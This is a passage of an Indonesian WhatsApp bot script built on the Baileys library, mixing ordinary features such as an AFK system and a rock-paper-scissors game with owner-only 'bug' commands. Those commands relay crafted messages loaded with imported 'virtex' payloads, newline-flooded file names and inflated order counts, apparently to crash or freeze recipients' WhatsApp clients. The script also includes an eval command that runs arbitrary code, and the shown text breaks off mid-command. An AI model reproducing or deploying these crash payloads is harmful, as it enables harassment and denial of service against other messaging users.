/*
› Create By Haikal
› Base Ori Haikal

KALAU MAU RENAME TARO CREDITS GUA : © RobotKu Pintar */

//=================================================//
require('./hwkal')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const path = require('path')
const os = require('os')
const cl = require('caliph-api') 
const crypto = require('crypto')
const hx = require('hxz-api')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const google = require('google-it')
const mathjs = require('mathjs')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { buttonfour } = require('./baseikal/virtex/buttonfour')
const { four } = require('./baseikal/virtex/four')
const { jobot } = require('./baseikal/virtex/jobot')
const { philips } = require('./baseikal/virtex/philips')
const { virtex1 } = require('./baseikal/virtex/virtex1')
const { virtex2 } = require('./baseikal/virtex/virtex2')
const { virtex3 } = require('./baseikal/virtex/virtex3')
const { iphone } = require('./baseikal/virtex/iphone')
const { kanjut } = require('./baseikal/virtex/kanjut')
const { doctext } = require('./baseikal/virtex/doctext')
const { bugweb } = require('./baseikal/virtex/bugweb')
const { doc } = require('./baseikal/virtex/doc')
const { jobot2 } = require('./baseikal/virtex/jobot2')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const content = JSON.stringify(m.message)
//=================================================//
const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const mekih = fs.readFileSync ('./baseikal/image/deden.jpeg')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
//=================================================//
// Function

//=================================================//
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
//=================================================//
// Group
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//=================================================//
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
// Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//document randomizer
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");

//=================================================//
const shieldid = fs.readFileSync('error.jpg')
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": fs.readFileSync('./error.jpg'),
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
//=================================================//
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ]️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6285814480623@s.whatsapp.net"
}}}}
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//=================================================//
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
} 
// Target
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
} 
//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
} catch (err) {
console.log(err)
}
//=================================================// 
// Public & Self
if (!haikal.public) {
if (!m.key.fromMe) return
}
//console bukan kontol
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: hw.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)

try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
haikal.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
bangkal(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
bangkal(`
Hello Saya 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'bugtagall': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
let teks = `══✪〘 *TAG ALL ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'TURU KUY'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
//=================================================//
case 'bugtroli2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"itemCount": 99999999999,	
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"jpegThumbnail": mekih,
"orderTitle": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"sellerJid": "6285814480623@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'bugdoc5': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${buttonkal}.HW` }, {quoted:doc})
}
break
case 'bugdoc3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${buttonkal}.HW` }, {quoted:doc})
 }
 break
case 'bugdoc2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bugdoc4': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug1': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case 'bug2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
//=================================================//
case 'bug3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
